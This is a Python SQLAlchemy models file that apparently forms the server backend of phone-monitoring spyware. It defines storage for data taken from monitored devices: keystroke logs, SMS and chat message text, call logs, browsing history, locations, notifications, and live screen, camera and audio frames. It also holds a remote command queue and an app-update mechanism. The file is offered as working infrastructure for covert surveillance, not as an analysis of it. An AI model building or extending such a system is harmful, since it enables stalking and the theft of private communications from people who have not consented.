from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, BigInteger, LargeBinary
from sqlalchemy.orm import relationship
from sqlalchemy.sql import func
from .database import Base

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    email = Column(String, unique=True, index=True, nullable=False)
    hashed_password = Column(String, nullable=False)
    is_active = Column(Boolean, default=True)

    devices = relationship("Device", back_populates="owner")
    call_logs = relationship("CallLog", back_populates="owner")
    sms_messages = relationship("SmsMessage", back_populates="owner")
    app_usage = relationship("AppUsage", back_populates="owner")
    web_activity = relationship("WebActivity", back_populates="owner")
    locations = relationship("Location", back_populates="owner")
    installed_apps = relationship("InstalledApp", back_populates="owner")
    notifications = relationship("Notification", back_populates="owner")
    keylogs = relationship("Keylog", back_populates="owner")
    chat_messages = relationship("ChatMessage", back_populates="owner")

class Device(Base):
    __tablename__ = "devices"

    id = Column(Integer, primary_key=True, index=True)
    device_token = Column(String, unique=True, index=True, nullable=False)
    name = Column(String)
    model = Column(String)
    os_version = Column(String)
    battery_level = Column(Integer, default=100)
    last_seen = Column(DateTime(timezone=True), default=func.now())
    owner_id = Column(Integer, ForeignKey("users.id"))

    owner = relationship("User", back_populates="devices")
    call_logs = relationship("CallLog", back_populates="device")
    sms_messages = relationship("SmsMessage", back_populates="device")
    app_usage = relationship("AppUsage", back_populates="device")
    web_activity = relationship("WebActivity", back_populates="device")
    locations = relationship("Location", back_populates="device")
    installed_apps = relationship("InstalledApp", back_populates="device")
    notifications = relationship("Notification", back_populates="device")
    keylogs = relationship("Keylog", back_populates="device")
    chat_messages = relationship("ChatMessage", back_populates="device")

class CallLog(Base):
    __tablename__ = "call_logs"

    id = Column(Integer, primary_key=True, index=True)
    number = Column(String, index=True)
    type = Column(Integer)
    date = Column(BigInteger)
    duration = Column(Integer)
    name = Column(String, nullable=True)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="call_logs")
    device = relationship("Device", back_populates="call_logs")

class SmsMessage(Base):
    __tablename__ = "sms_messages"

    id = Column(Integer, primary_key=True, index=True)
    address = Column(String, index=True)
    body = Column(String)
    date = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="sms_messages")
    device = relationship("Device", back_populates="sms_messages")

class AppUsage(Base):
    __tablename__ = "app_usage"

    id = Column(Integer, primary_key=True, index=True)
    app_name = Column(String, index=True)
    package_name = Column(String)
    duration = Column(Integer) # in seconds
    date = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="app_usage")
    device = relationship("Device", back_populates="app_usage")

class WebActivity(Base):
    __tablename__ = "web_activity"

    id = Column(Integer, primary_key=True, index=True)
    url = Column(String, index=True)
    title = Column(String)
    visit_time = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="web_activity")
    device = relationship("Device", back_populates="web_activity")

class InstalledApp(Base):
    __tablename__ = "installed_apps"

    id = Column(Integer, primary_key=True, index=True)
    app_name = Column(String, index=True)
    package_name = Column(String)
    install_date = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="installed_apps")
    device = relationship("Device", back_populates="installed_apps")

class Notification(Base):
    __tablename__ = "notifications"

    id = Column(Integer, primary_key=True, index=True)
    package_name = Column(String, index=True)
    title = Column(String)
    text = Column(String)
    post_time = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="notifications")
    device = relationship("Device", back_populates="notifications")

class Location(Base):
    __tablename__ = "locations"

    id = Column(Integer, primary_key=True, index=True)
    latitude = Column(String)
    longitude = Column(String)
    timestamp = Column(BigInteger)
    owner_id = Column(Integer, ForeignKey("users.id"))
    device_id = Column(Integer, ForeignKey("devices.id"))

    owner = relationship("User", back_populates="locations")
    device = relationship("Device", back_populates="locations")

class Command(Base):
    __tablename__ = "commands"
    id = Column(Integer, primary_key=True, index=True)
    command_type = Column(String)
    status = Column(String, default="pending")
    payload = Column(String, nullable=True)
    result = Column(String, nullable=True)
    created_at = Column(DateTime(timezone=True), default=func.now())
    device_id = Column(Integer, ForeignKey("devices.id"))
    owner_id = Column(Integer, ForeignKey("users.id"))

    @property
    def command(self):
        return self.command_type

    def __init__(self, **kwargs):
        if "command" in kwargs and "command_type" not in kwargs:
            kwargs["command_type"] = kwargs.pop("command")
        if "created_at" in kwargs and isinstance(kwargs["created_at"], (int, float)):
            import datetime
            ts = kwargs["created_at"]
            if ts > 1e11:
                ts = ts / 1000.0
            kwargs["created_at"] = datetime.datetime.fromtimestamp(ts, tz=datetime.timezone.utc)
        if "status" in kwargs and kwargs["status"] == "PENDING":
            kwargs["status"] = "pending"
        super().__init__(**kwargs)

class MediaFile(Base):
    __tablename__ = "media_files"
    id = Column(Integer, primary_key=True, index=True)
    s3_key = Column(String)
    file_type = Column(String)
    file_name = Column(String, default="unknown")
    file_path = Column(String)
    category = Column(String)
    size = Column(Integer, default=0)
    thumbnail_key = Column(String)
    captured_at = Column(BigInteger, default=0)
    created_at = Column(DateTime(timezone=True), default=func.now())
    device_id = Column(Integer, ForeignKey("devices.id"))
    owner_id = Column(Integer, ForeignKey("users.id"))

class Keylog(Base):
    __tablename__ = "keylogs"
    id = Column(Integer, primary_key=True, index=True)
    package_name = Column(String, index=True)
    app_name = Column(String)
    typed_text = Column(String)
    timestamp = Column(BigInteger)
    device_id = Column(Integer, ForeignKey("devices.id"))
    owner_id = Column(Integer, ForeignKey("users.id"))

    owner = relationship("User", back_populates="keylogs")
    device = relationship("Device", back_populates="keylogs")

class ChatMessage(Base):
    __tablename__ = "chat_messages"
    id = Column(Integer, primary_key=True, index=True)
    package_name = Column(String, index=True)
    app_name = Column(String)
    sender = Column(String)
    text = Column(String)
    timestamp = Column(BigInteger)
    device_id = Column(Integer, ForeignKey("devices.id"))
    owner_id = Column(Integer, ForeignKey("users.id"))

    owner = relationship("User", back_populates="chat_messages")
    device = relationship("Device", back_populates="chat_messages")

class LiveScreenFrame(Base):
    __tablename__ = "live_screen_frames"

    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
    frame_data = Column(LargeBinary)
    timestamp = Column(BigInteger)

    device = relationship("Device")

class LiveCameraFrame(Base):
    __tablename__ = "live_camera_frames"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
    frame_data = Column(LargeBinary)
    timestamp = Column(BigInteger)
    device = relationship("Device")

class AppUpdate(Base):
    __tablename__ = "app_updates"
    id = Column(Integer, primary_key=True, index=True)
    version_name = Column(String)
    version_code = Column(Integer, unique=True)
    s3_key = Column(String)
    file_size = Column(Integer, default=0)
    created_at = Column(DateTime(timezone=True), default=func.now())
    uploaded_by = Column(Integer, ForeignKey("users.id"))

class LiveAudioFrame(Base):
    __tablename__ = "live_audio_frames"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
    frame_data = Column(LargeBinary)
    timestamp = Column(BigInteger)
    device = relationship("Device")
